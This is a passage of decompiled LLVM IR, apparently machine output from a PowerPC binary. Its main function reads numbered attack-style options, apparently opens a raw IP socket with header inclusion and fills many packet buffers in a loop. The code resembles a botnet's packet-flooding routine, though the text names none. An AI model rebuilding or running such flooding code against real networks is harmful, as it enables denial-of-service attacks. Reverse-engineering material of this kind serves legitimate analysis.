dec_label_pc_10002a34:                            ; preds = %dec_label_pc_100029a4
  %v0_10002a34 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10002a34 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10002a34 = or i1 %v0_10002a34, %v1_10002a34
  br i1 %v2_10002a34, label %dec_label_pc_100028d0.outer, label %dec_label_pc_100028d4

dec_label_pc_10002a3c:                            ; preds = %dec_label_pc_100028e4
  %v1_10002a3c = add i32 %v2_100028f0, 16
  %v2_10002a3c = inttoptr i32 %v1_10002a3c to i32*
  %v3_10002a3c = load i32, i32* %v2_10002a3c, align 4
  store i32 %v3_10002a3c, i32* %r29.global-to-local, align 4
  %v0_10002a40 = call i32 @function_10006318()
  store i32 %v0_10002a40, i32* %r3.global-to-local, align 4
  %v3_10002a44 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002a44, i32* %r9.global-to-local, align 4
  %v0_10002a48 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002a48 = mul i32 %v0_10002a48, 16
  %v2_10002a48 = udiv i32 %v0_10002a48, 268435456
  %v3_10002a48 = or i32 %v2_10002a48, %v1_10002a48
  store i32 %v3_10002a48, i32* %r20.global-to-local, align 4
  %v1_10002a4c = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002a48)
  %v1_10002a50 = mul nuw i32 %v2_10002a48, 268435456
  %v2_10002a50 = urem i32 %v0_10002a48, 268435456
  %v3_10002a50 = or i32 %v1_10002a50, %v2_10002a50
  store i32 %v3_10002a50, i32* %r20.global-to-local, align 4
  %v0_10002a54 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002a54 = mul i32 %v0_10002a54, 24
  %v1_10002a58 = load i32, i32* %r25.global-to-local, align 4
  %v2_10002a58 = add i32 %v1_10002a58, %v1_10002a54
  store i32 %v2_10002a58, i32* %r9.global-to-local, align 4
  %v1_10002a5c = add i32 %v2_10002a58, 20
  %v2_10002a5c = inttoptr i32 %v1_10002a5c to i8*
  %v3_10002a5c = load i8, i8* %v2_10002a5c, align 1
  %v4_10002a5c = zext i8 %v3_10002a5c to i32
  store i32 %v4_10002a5c, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10002a5c, 64
  %v2_10002a60 = zext i8 %tmp to i32
  %v3_10002a60 = lshr i32 %v0_10002a40, %v2_10002a60
  store i32 %v3_10002a60, i32* %r3.global-to-local, align 4
  %v0_10002a64 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002a64 = add i32 %v3_10002a60, %v0_10002a64
  store i32 %v2_10002a64, i32* %r29.global-to-local, align 4
  %v1_10002a68 = load i32, i32* %r28.global-to-local, align 4
  %v2_10002a68 = add i32 %v1_10002a68, 16
  %v3_10002a68 = inttoptr i32 %v2_10002a68 to i32*
  store i32 %v2_10002a64, i32* %v3_10002a68, align 4
  %v0_10002a6c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002a6c, label %dec_label_pc_10002a70, label %dec_label_pc_1000291c

dec_label_pc_10002a70:                            ; preds = %dec_label_pc_10002a3c, %dec_label_pc_1000290c
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10002a74 = call i32 @function_10006318()
  store i32 %v0_10002a74, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r29, align 4
  %v1_10002a7c = load i32, i32* %r28.global-to-local, align 4
  %v2_10002a7c = add i32 %v1_10002a7c, 12
  %v3_10002a7c = inttoptr i32 %v2_10002a7c to i32*
  store i32 %v0_10002a74, i32* %v3_10002a7c, align 4
  %v0_10002a80 = load i32, i32* %r24.global-to-local, align 4
  %v1_10002a80 = load i32, i32* @r29, align 4
  %v4_10002a80 = icmp eq i32 %v0_10002a80, %v1_10002a80
  store i1 %v4_10002a80, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10002a80, label %dec_label_pc_10002a88, label %dec_label_pc_1000292c

dec_label_pc_10002a88:                            ; preds = %dec_label_pc_10002a70, %dec_label_pc_1000291c
  %v0_10002a88 = call i32 @function_10006318()
  %v0_10002a8c = load i32, i32* %r16.global-to-local, align 4
  %v1_10002a8c = load i32, i32* @r29, align 4
  %v4_10002a8c = icmp eq i32 %v0_10002a8c, %v1_10002a8c
  store i1 %v4_10002a8c, i1* %cr7_eq.global-to-local, align 1
  %v1_10002a90 = urem i32 %v0_10002a88, 65536
  store i32 %v1_10002a90, i32* %r3.global-to-local, align 4
  %v1_10002a94 = add nsw i32 %v1_10002a90, -1000
  store i32 %v1_10002a94, i32* %r0.global-to-local, align 4
  %v1_10002a98 = trunc i32 %v0_10002a88 to i16
  %v2_10002a98 = load i32, i32* %r28.global-to-local, align 4
  %v3_10002a98 = add i32 %v2_10002a98, 4
  %v4_10002a98 = inttoptr i32 %v3_10002a98 to i16*
  store i16 %v1_10002a98, i16* %v4_10002a98, align 2
  %v0_10002a9c = load i32, i32* %r0.global-to-local, align 4
  %v1_10002a9c = sub i32 -1, %v0_10002a9c
  store i32 %v1_10002a9c, i32* %r0.global-to-local, align 4
  %v1_10002aa0 = trunc i32 %v1_10002a9c to i16
  %v2_10002aa0 = load i32, i32* @r31, align 4
  %v3_10002aa0 = add i32 %v2_10002aa0, 4
  %v4_10002aa0 = inttoptr i32 %v3_10002aa0 to i16*
  store i16 %v1_10002aa0, i16* %v4_10002aa0, align 2
  br i1 %v4_10002a8c, label %dec_label_pc_10002aa8, label %dec_label_pc_10002a88.dec_label_pc_10002934_crit_edge

dec_label_pc_10002a88.dec_label_pc_10002934_crit_edge: ; preds = %dec_label_pc_10002a88
  %v1_10002934.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10002934

dec_label_pc_10002aa8:                            ; preds = %dec_label_pc_10002a88, %dec_label_pc_1000292c
  %v0_10002aa8 = call i32 @function_10006318()
  %v1_10002aa8 = trunc i32 %v0_10002aa8 to i16
  store i32 %v0_10002aa8, i32* %r3.global-to-local, align 4
  %v0_10002aac = load i32, i32* %r17.global-to-local, align 4
  %v1_10002aac = load i32, i32* @r29, align 4
  %v4_10002aac = icmp eq i32 %v0_10002aac, %v1_10002aac
  store i1 %v4_10002aac, i1* %cr7_eq.global-to-local, align 1
  %v3_10002ab0 = load i32, i32* %r28.global-to-local, align 4
  %v4_10002ab0 = add i32 %v3_10002ab0, 58
  %v5_10002ab0 = inttoptr i32 %v4_10002ab0 to i16*
  store i16 %v1_10002aa8, i16* %v5_10002ab0, align 2
  br i1 %v4_10002aac, label %dec_label_pc_10002ab8, label %dec_label_pc_1000293c

dec_label_pc_10002ab8:                            ; preds = %dec_label_pc_10002aa8, %dec_label_pc_10002934
  %v0_10002ab8 = call i32 @function_10006318()
  %v1_10002ab8 = trunc i32 %v0_10002ab8 to i16
  store i32 %v0_10002ab8, i32* %r3.global-to-local, align 4
  %v3_10002abc = load i32, i32* %r27.global-to-local, align 4
  %v4_10002abc = add i32 %v3_10002abc, 2
  %v5_10002abc = inttoptr i32 %v4_10002abc to i16*
  store i16 %v1_10002ab8, i16* %v5_10002abc, align 2
  %v0_10002ac0 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002ac0, label %dec_label_pc_10002ac4, label %dec_label_pc_10002940

dec_label_pc_10002ac4:                            ; preds = %dec_label_pc_10002ab8, %dec_label_pc_1000293c
  %v0_10002ac4 = call i32 @function_10006318()
  store i32 %v0_10002ac4, i32* %r3.global-to-local, align 4
  %v1_10002ac8 = load i32, i32* @r31, align 4
  %v2_10002ac8 = add i32 %v1_10002ac8, 16
  %v3_10002ac8 = inttoptr i32 %v2_10002ac8 to i32*
  store i32 %v0_10002ac4, i32* %v3_10002ac8, align 4
  br label %dec_label_pc_10002948

dec_label_pc_10002ad0:                            ; preds = %dec_label_pc_10002948
  %v0_10002ad0 = load i32, i32* %r27.global-to-local, align 4
  %v1_10002ad0 = add i32 %v0_10002ad0, 8
  store i32 %v1_10002ad0, i32* @r3, align 4
  %v0_10002ad4 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10002ad4, i32* @r4, align 4
  %v0_10002ad8 = call i32 @function_10006544()
  store i32 %v0_10002ad8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100029a4

; uselistorder directives
  uselistorder i32 %v0_10002ab8, { 1, 0 }
  uselistorder i32 %v0_10002aa8, { 1, 0 }
  uselistorder i32 %v1_10002a9c, { 1, 0 }
  uselistorder i32 %v1_10002a90, { 1, 0 }
  uselistorder i32 %v0_10002a88, { 1, 0 }
  uselistorder i32 %v1_10002a80, { 1, 0 }
  uselistorder i32 %v0_10002a48, { 2, 1, 0 }
  uselistorder i1 %v1_10002a34, { 1, 0 }
  uselistorder i1 %v0_10002a34, { 1, 0 }
  uselistorder i32 %v1_10002a24, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_10002a00, { 0, 2, 1, 3 }
  uselistorder i32 %v4_100029e0, { 1, 0 }
  uselistorder i32 %v0_1000290c, { 2, 1, 0 }
  uselistorder i32 %v4_100028ec, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100028e8, { 1, 0 }
  uselistorder i32 %v1_10002834, { 1, 0 }
  uselistorder i32 %v1_10002770, { 1, 0 }
  uselistorder i32 %v1_10002764, { 1, 0 }
  uselistorder i32 %v1_10002700, { 1, 0 }
  uselistorder i32 %v0_10002700, { 1, 2, 3, 0 }
  uselistorder i32 %v1_100026f0, { 1, 2, 0 }
  uselistorder i32 %v0_100026e4, { 1, 0 }
  uselistorder i32 %v5_10002690, { 0, 3, 1, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 8, 9, 21, 22 }
  uselistorder i32* %r31.global-to-local, { 0, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 1, 2, 3, 4, 16 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 1, 29, 22, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3, 4, 8, 5, 6, 7 }
  uselistorder i32* %r27.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9, 10 }
  uselistorder i32* %r20.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 23, 24, 12, 26, 27, 28, 29, 30 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cr4_lt.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32 38, { 3, 4, 5, 6, 0, 7, 1, 8, 2, 9 }
  uselistorder i32 66, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100029a4, { 1, 0 }
  uselistorder label %dec_label_pc_100028d4, { 1, 0 }
  uselistorder label %dec_label_pc_100028d0, { 1, 0 }
  uselistorder label %dec_label_pc_100028b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000284c, { 1, 0 }
  uselistorder label %dec_label_pc_10002820, { 1, 0 }
  uselistorder label %dec_label_pc_100027b8, { 1, 0 }
}

define i32 @function_10002ae0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10002ae0:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-104 = alloca i32, align 4
  %v0_10002ae4 = load i32, i32* @lr, align 4
  store i32 %v0_10002ae4, i32* %r0.global-to-local, align 4
  %v0_10002ae8 = call i32 @__asm_mfcr()
  store i32 %v0_10002ae8, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r26.global-to-local, align 4
  %v0_10002af8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10002ae8, i32* %r19.global-to-local, align 4
  %v0_10002b2c = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10002b34 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_10002b3c = load i32, i32* @r30, align 4
  %v0_10002b40 = load i32, i32* @r31, align 4
  store i32 268446548, i32* @lr, align 4
  %v2_10002b50 = call i32 @function_10008ec0(i32 4, i32 4)
  store i32 %v2_10002b50, i32* %r20.global-to-local, align 4
  %v0_10002b58 = load i32, i32* @r28, align 4
  %v0_10002b64 = load i32, i32* @r29, align 4
  store i32 %v0_10002b64, i32* %r3.global-to-local, align 4
  store i32 268446572, i32* @lr, align 4
  %v4_10002b68 = inttoptr i32 %v0_10002b58 to i32*
  %v5_10002b68 = call i32 @function_100021c0(i32 %v0_10002b64, i32* %v4_10002b68, i32 2, i32 0)
  %v0_10002b78 = load i32, i32* @r28, align 4
  %v1_10002b7c = urem i32 %v5_10002b68, 256
  store i32 %v1_10002b7c, i32* %r14.global-to-local, align 4
  %v0_10002b80 = load i32, i32* @r29, align 4
  store i32 %v0_10002b80, i32* %r3.global-to-local, align 4
  store i32 268446600, i32* @lr, align 4
  %v4_10002b84 = inttoptr i32 %v0_10002b78 to i32*
  %v5_10002b84 = call i32 @function_100021c0(i32 %v0_10002b80, i32* %v4_10002b84, i32 3, i32 65535)
  %v0_10002b88 = load i32, i32* @r28, align 4
  store i32 %v5_10002b84, i32* %r25.global-to-local, align 4
  %v0_10002b98 = load i32, i32* @r29, align 4
  store i32 %v0_10002b98, i32* %r3.global-to-local, align 4
  store i32 268446624, i32* @lr, align 4
  %v4_10002b9c = inttoptr i32 %v0_10002b88 to i32*
  %v5_10002b9c = call i32 @function_100021c0(i32 %v0_10002b98, i32* %v4_10002b9c, i32 4, i32 64)
  %v0_10002ba0 = load i32, i32* @r28, align 4
  %v1_10002bac = urem i32 %v5_10002b9c, 256
  store i32 %v1_10002bac, i32* %r21.global-to-local, align 4
  %v0_10002bb0 = load i32, i32* @r29, align 4
  store i32 %v0_10002bb0, i32* %r3.global-to-local, align 4
  store i32 268446648, i32* @lr, align 4
  %v4_10002bb4 = inttoptr i32 %v0_10002ba0 to i32*
  %v5_10002bb4 = call i32 @function_100021c0(i32 %v0_10002bb0, i32* %v4_10002bb4, i32 5, i32 1)
  %v0_10002bc4 = load i32, i32* @r28, align 4
  %v1_10002bc8 = urem i32 %v5_10002bb4, 256
  store i32 %v1_10002bc8, i32* @r31, align 4
  %v0_10002bcc = load i32, i32* @r29, align 4
  store i32 %v0_10002bcc, i32* %r3.global-to-local, align 4
  store i32 268446676, i32* @lr, align 4
  %v4_10002bd0 = inttoptr i32 %v0_10002bc4 to i32*
  %v5_10002bd0 = call i32 @function_100021c0(i32 %v0_10002bcc, i32* %v4_10002bd0, i32 6, i32 65535)
  %v0_10002bd8 = load i32, i32* @r28, align 4
  store i32 %v5_10002bd0, i32* %r24.global-to-local, align 4
  %v0_10002be8 = load i32, i32* @r29, align 4
  store i32 %v0_10002be8, i32* %r3.global-to-local, align 4
  store i32 268446704, i32* @lr, align 4
  %v4_10002bec = inttoptr i32 %v0_10002bd8 to i32*
  %v5_10002bec = call i32 @function_100021c0(i32 %v0_10002be8, i32* %v4_10002bec, i32 7, i32 65535)
  %v0_10002bf0 = load i32, i32* @r28, align 4
  store i32 %v5_10002bec, i32* %r27.global-to-local, align 4
  %v0_10002c00 = load i32, i32* @r29, align 4
  store i32 %v0_10002c00, i32* %r3.global-to-local, align 4
  store i32 268446728, i32* @lr, align 4
  %v4_10002c04 = inttoptr i32 %v0_10002bf0 to i32*
  %v5_10002c04 = call i32 @function_100021c0(i32 %v0_10002c00, i32* %v4_10002c04, i32 0, i32 512)
  %v0_10002c08 = load i32, i32* @r28, align 4
  store i32 %v5_10002c04, i32* %r16.global-to-local, align 4
  %v0_10002c18 = load i32, i32* @r29, align 4
  store i32 %v0_10002c18, i32* %r3.global-to-local, align 4
  store i32 268446752, i32* @lr, align 4
  %v4_10002c1c = inttoptr i32 %v0_10002c08 to i32*
  %v5_10002c1c = call i32 @function_100021c0(i32 %v0_10002c18, i32* %v4_10002c1c, i32 1, i32 1)
  %v0_10002c20 = load i32, i32* @r28, align 4
  %v1_10002c2c = urem i32 %v5_10002c1c, 256
  store i32 %v1_10002c2c, i32* %r15.global-to-local, align 4
  %v0_10002c30 = load i32, i32* @r29, align 4
  store i32 %v0_10002c30, i32* %r3.global-to-local, align 4
  store i32 268446776, i32* @lr, align 4
  %v4_10002c34 = inttoptr i32 %v0_10002c20 to i32*
  %v5_10002c34 = call i32 @function_100021c0(i32 %v0_10002c30, i32* %v4_10002c34, i32 19, i32 0)
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_10002c3c = load i32, i32* @global_var_1001b288.63, align 4
  %v0_10002c40 = load i32, i32* @r28, align 4
  store i32 %v5_10002c34, i32* %r30.global-to-local, align 4
  %v0_10002c4c = load i32, i32* @r29, align 4
  store i32 %v0_10002c4c, i32* %r3.global-to-local, align 4
  store i32 268446804, i32* @lr, align 4
  %v4_10002c50 = inttoptr i32 %v0_10002c40 to i32*
  %v5_10002c50 = call i32 @function_100021c0(i32 %v0_10002c4c, i32* %v4_10002c50, i32 25, i32 %v3_10002c3c)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268446824, i32* @lr, align 4
  %v3_10002c64 = call i32 @function_10008b34(i32 2, i32 3, i32 6)
  store i32 %v3_10002c64, i32* %r3.global-to-local, align 4
  %v3_10002c68 = icmp eq i32 %v3_10002c64, -1
  store i1 %v3_10002c68, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10002c64, i32* %r23.global-to-local, align 4
  br i1 %v3_10002c68, label %dec_label_pc_10002e00, label %dec_label_pc_10002c74

dec_label_pc_10002c74:                            ; preds = %dec_label_pc_10002ae0
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10002c80 = ptrtoint i32* %stack_var_-104 to i32
  store i32 1, i32* %stack_var_-104, align 4
  store i32 268446864, i32* @lr, align 4
  %v5_10002c8c = call i32 @function_10008af8(i32 0, i32 3, i32 %v2_10002c80, i32 4, i32 4)
  store i32 %v5_10002c8c, i32* %r3.global-to-local, align 4
  %v3_10002c90 = icmp eq i32 %v5_10002c8c, -1
  store i1 %v3_10002c90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10002c90, label %dec_label_pc_10002df8, label %dec_label_pc_10002c98

dec_label_pc_10002c98:                            ; preds = %dec_label_pc_10002c74
  %v0_10002c98 = load i32, i32* %r19.global-to-local, align 4
  %v1_10002c98 = icmp slt i32 %v0_10002c98, 0
  %v3_10002c98 = icmp eq i32 %v0_10002c98, 0
  store i1 %v1_10002c98, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10002c98, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-104, align 4
  %v0_10002ca4 = load i32, i32* %r25.global-to-local, align 4
  %v1_10002ca4 = urem i32 %v0_10002ca4, 65536
  store i32 %v1_10002ca4, i32* %r25.global-to-local, align 4
  %v0_10002ca8 = load i32, i32* %r24.global-to-local, align 4
  %v1_10002ca8 = urem i32 %v0_10002ca8, 65536
  store i32 %v1_10002ca8, i32* %r17.global-to-local, align 4
  %v0_10002cac = load i32, i32* %r27.global-to-local, align 4
  %v1_10002cac = urem i32 %v0_10002cac, 65536
  store i32 %v1_10002cac, i32* %r18.global-to-local, align 4
  %v0_10002cb0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10002cb0 = urem i32 %v0_10002cb0, 256
  store i32 %v1_10002cb0, i32* %r3.global-to-local, align 4
  %tmp33 = icmp slt i32 %v0_10002c98, 1
  br i1 %tmp33, label %dec_label_pc_10002e60, label %dec_label_pc_10002cb8

dec_label_pc_10002cb8:                            ; preds = %dec_label_pc_10002c98
  %v0_10002cb8 = load i32, i32* @r31, align 4
  %v3_10002cb8 = icmp eq i32 %v0_10002cb8, 0
  store i1 %v3_10002cb8, i1* %cr2_eq.global-to-local, align 1
  %v3_10002cbc = icmp eq i32 %v1_10002cb0, 0
  store i1 %v3_10002cbc, i1* %cr3_eq.global-to-local, align 1
  %v0_10002cc0 = load i32, i32* %r16.global-to-local, align 4
  %v1_10002cc0 = urem i32 %v0_10002cc0, 65536
  %v0_10002ca4.not = or i32 %v0_10002ca4, -65536
  %v1_10002cc4 = xor i32 %v0_10002ca4.not, 65535
  store i32 %v1_10002cc4, i32* %r11.global-to-local, align 4
  %v1_10002ccc = add nuw nsw i32 %v1_10002cc0, 52
  store i32 %v1_10002ccc, i32* %r0.global-to-local, align 4
  %v1_10002cd0 = add nuw nsw i32 %v1_10002cc0, 28
  store i32 %v1_10002cd0, i32* %r9.global-to-local, align 4
  %fold = add i32 %v0_10002cc0, 52
  %v1_10002cd4 = urem i32 %fold, 65536
  store i32 %v1_10002cd4, i32* %r22.global-to-local, align 4
  %fold8 = add i32 %v0_10002cc0, 28
  %v1_10002cd8 = urem i32 %fold8, 65536
  store i32 %v1_10002cd8, i32* %r24.global-to-local, align 4
  %v1_10002cdc = urem i32 %v1_10002cc4, 65536
  store i32 %v1_10002cdc, i32* %r27.global-to-local, align 4
  %fold9 = add i32 %v0_10002cc0, 8
  %v1_10002ce0 = urem i32 %fold9, 65536
  store i32 %v1_10002ce0, i32* @r28, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10002d14

dec_label_pc_10002cec:                            ; preds = %dec_label_pc_10002dd4
  %v0_10002cec = load i32, i32* %r31.global-to-local, align 4
  %v1_10002cec = add i32 %v0_10002cec, 16
  %v2_10002cec = inttoptr i32 %v1_10002cec to i32*
  %v3_10002cec = load i32, i32* %v2_10002cec, align 4
  store i32 %v3_10002cec, i32* %r0.global-to-local, align 4
  %v1_10002cf0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10002cf0 = add i32 %v1_10002cf0, 16
  %v3_10002cf0 = inttoptr i32 %v2_10002cf0 to i32*
  store i32 %v3_10002cec, i32* %v3_10002cf0, align 4
  br label %dec_label_pc_10002cf4

dec_label_pc_10002cf4:                            ; preds = %dec_label_pc_10002df0, %dec_label_pc_10002cec
  %v3_10002cf4 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002cf4, i32* %r9.global-to-local, align 4
  %v0_10002cf8 = load i32, i32* @r28, align 4
  %v1_10002cf8 = trunc i32 %v0_10002cf8 to i16
  %v2_10002cf8 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002cf8 = add i32 %v2_10002cf8, 4
  %v4_10002cf8 = inttoptr i32 %v3_10002cf8 to i16*
  store i16 %v1_10002cf8, i16* %v4_10002cf8, align 2
  %v0_10002cfc = load i32, i32* %r9.global-to-local, align 4
  %v1_10002cfc = add i32 %v0_10002cfc, 1
  store i32 %v1_10002cfc, i32* %r31.global-to-local, align 4
  %v0_10002d00 = load i32, i32* %r17.global-to-local, align 4
  %v1_10002d00 = trunc i32 %v0_10002d00 to i16
  %v2_10002d00 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002d00 = inttoptr i32 %v2_10002d00 to i16*
  store i16 %v1_10002d00, i16* %v3_10002d00, align 2
  %v0_10002d04 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002d04 = load i32, i32* %r19.global-to-local, align 4
  %v2_10002d04 = icmp slt i32 %v0_10002d04, %v1_10002d04
  %v4_10002d04 = icmp eq i32 %v0_10002d04, %v1_10002d04
  store i1 %v4_10002d04, i1* %cr7_eq.global-to-local, align 1
  %v0_10002d08 = load i32, i32* %r18.global-to-local, align 4
  %v1_10002d08 = trunc i32 %v0_10002d08 to i16
  %v2_10002d08 = load i32, i32* %r29.global-to-local, align 4
  %v3_10002d08 = add i32 %v2_10002d08, 2
  %v4_10002d08 = inttoptr i32 %v3_10002d08 to i16*
  store i16 %v1_10002d08, i16* %v4_10002d08, align 2
  %v0_10002d0c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002d0c, i32* %stack_var_-104, align 4
  br i1 %v2_10002d04, label %dec_label_pc_10002d14, label %dec_label_pc_10002e64

dec_label_pc_10002d14:                            ; preds = %dec_label_pc_10002cf4, %dec_label_pc_10002cb8
  store i32 1510, i32* %r3.global-to-local, align 4
  store i32 268447008, i32* @lr, align 4
  %v2_10002d1c = call i32 @function_10008ec0(i32 1510, i32 4)
  store i32 %v2_10002d1c, i32* %r3.global-to-local, align 4
  %v3_10002d20 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_10002d20, i32* %r9.global-to-local, align 4
  %v0_10002d24 = load i32, i32* @r31, align 4
  %v1_10002d24 = mul i32 %v0_10002d24, 4
  store i32 %v1_10002d24, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r11.global-to-local, align 4
  %v1_10002d2c = load i32, i32* %r20.global-to-local, align 4
  %v3_10002d2c = add i32 %v1_10002d2c, %v1_10002d24
  %v4_10002d2c = inttoptr i32 %v3_10002d2c to i32*
  store i32 %v2_10002d1c, i32* %v4_10002d2c, align 4
  %v0_10002d30 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002d30 = mul i32 %v0_10002d30, 4
  store i32 %v1_10002d30, i32* %r9.global-to-local, align 4
  %v1_10002d34 = load i32, i32* %r20.global-to-local, align 4
  %v2_10002d34 = add i32 %v1_10002d34, %v1_10002d30
  %v3_10002d34 = inttoptr i32 %v2_10002d34 to i32*
  %v4_10002d34 = load i32, i32* %v3_10002d34, align 4
  store i32 %v4_10002d34, i32* %r31.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10002d3c = inttoptr i32 %v4_10002d34 to i32*
  %v2_10002d3c = load i32, i32* %v1_10002d3c, align 4
  store i32 %v2_10002d3c, i32* %r0.global-to-local, align 4
  %v1_10002d40 = add i32 %v4_10002d34, 24
  store i32 %v1_10002d40, i32* %r30.global-to-local, align 4
  %v0_10002d44 = load i32, i32* %r21.global-to-local, align 4
  %v1_10002d44 = trunc i32 %v0_10002d44 to i8
  %v3_10002d44 = add i32 %v4_10002d34, 8
  %v4_10002d44 = inttoptr i32 %v3_10002d44 to i8*
  store i8 %v1_10002d44, i8* %v4_10002d44, align 1
  %v0_10002d48 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002d48 = add i32 %v0_10002d48, 44
  store i32 %v1_10002d48, i32* %r29.global-to-local, align 4
  %v1_10002d4c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002d4c, i32* %r0.global-to-local, align 4
  %v0_10002d50 = load i32, i32* %r25.global-to-local, align 4
  %v1_10002d50 = trunc i32 %v0_10002d50 to i16
  %v2_10002d50 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002d50 = add i32 %v2_10002d50, 4
  %v4_10002d50 = inttoptr i32 %v3_10002d50 to i16*
  store i16 %v1_10002d50, i16* %v4_10002d50, align 2
  %v1_10002d54 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002d54, i32* %r0.global-to-local, align 4
  %v0_10002d58 = load i32, i32* %r31.global-to-local, align 4
  %v1_10002d58 = add i32 %v0_10002d58, 20
  store i32 %v1_10002d58, i32* %r9.global-to-local, align 4
  %v2_10002d5c = inttoptr i32 %v0_10002d58 to i32*
  store i32 %v1_10002d54, i32* %v2_10002d5c, align 4
  %v0_10002d60 = load i32, i32* %r14.global-to-local, align 4
  %v1_10002d60 = trunc i32 %v0_10002d60 to i8
  %v2_10002d60 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002d60 = add i32 %v2_10002d60, 1
  %v4_10002d60 = inttoptr i32 %v3_10002d60 to i8*
  store i8 %v1_10002d60, i8* %v4_10002d60, align 1
  %v0_10002d64 = load i32, i32* %r22.global-to-local, align 4
  %v1_10002d64 = trunc i32 %v0_10002d64 to i16
  %v2_10002d64 = load i32, i32* %r31.global-to-local, align 4
  %v3_10002d64 = add i32 %v2_10002d64, 2
  %v4_10002d64 = inttoptr i32 %v3_10002d64 to i16*
  store i16 %v1_10002d64, i16* %v4_10002d64, align 2
  %v0_10002d68 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002d68, label %dec_label_pc_10002d74, label %dec_label_pc_10002d6c

